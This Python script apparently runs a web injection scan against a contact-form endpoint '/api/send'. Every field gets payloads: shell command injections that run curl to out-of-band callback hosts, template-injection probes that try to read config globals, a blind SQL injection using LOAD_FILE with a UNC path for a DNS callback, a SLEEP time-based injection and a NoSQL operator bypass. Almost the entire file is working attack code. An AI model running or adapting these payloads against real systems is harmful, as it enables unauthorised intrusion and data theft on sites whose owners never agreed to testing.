import sys, time, re, json
sys.path.insert(0,'/work/tool_outputs')
from w40_lib import req, form

H_CMDI = "oob53dfdb9caf31.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
H_SSTI = "oobe02889f0fede.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
H_XXE  = "oobb4ca2ac079ce.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
H_SQL  = "oob1c64776fbbc2.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
DOM = "dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

BASE = {'fname':'probe','lname':'Security','areacode':'973','tel':'5551234',
        'cname':'QA Tester','subject':'Hello there','msg':'Testing message body',
        'check':'on','targets':'probe@relay.invalid'}

def fire(name, d, delay=6):
    st,h,b = req("/api/send", form(d))
    m = re.search(rb'"id":"([^"]+)"', b)
    err = b'"error":null' in b
    print("%-22s code=%s ok=%s id=%s" % (name, st, err, m.group(1).decode() if m else b[:70]))
    time.sleep(delay)
    return b

# --- CMDi across all string fields
fire("cmdi_fname",  dict(BASE, fname="a;curl http://%s/cmdi" % H_CMDI))
fire("cmdi_msg",    dict(BASE, msg="a$(curl http://%s/cmdi2)" % H_CMDI))
fire("cmdi_subj",   dict(BASE, subject="a`curl http://%s/cmdi3`" % H_CMDI))
fire("cmdi_cname",  dict(BASE, cname="a|curl http://%s/cmdi4" % H_CMDI))
fire("cmdi_lname",  dict(BASE, lname="a%0acurl http://%s/cmdi5" % H_CMDI))
# --- SSTI
fire("ssti_fname",  dict(BASE, fname="{{7*7}}"))
fire("ssti_msg",    dict(BASE, msg="${7*7}"))
fire("ssti_cname",  dict(BASE, cname="<%= 7*7 %>"))
fire("ssti_subj",   dict(BASE, subject="{{config.__class__.__init__.__globals__}}"))
# --- blind SQLi w/ OOB (DNS/UNC) in subject
fire("sql_subject_dns", dict(BASE, subject="a'||(SELECT LOAD_FILE(CONCAT('\\\\\\\\%s\\\\\\\\x')))||'" % H_SQL))
fire("sql_msg_time",  dict(BASE, msg="a' AND (SELECT * FROM (SELECT(SLEEP(8)))a)-- -"))
# --- NoSQLi operator forms
fire("nosql_ne",   dict(BASE, fname={"$ne":""}, ))
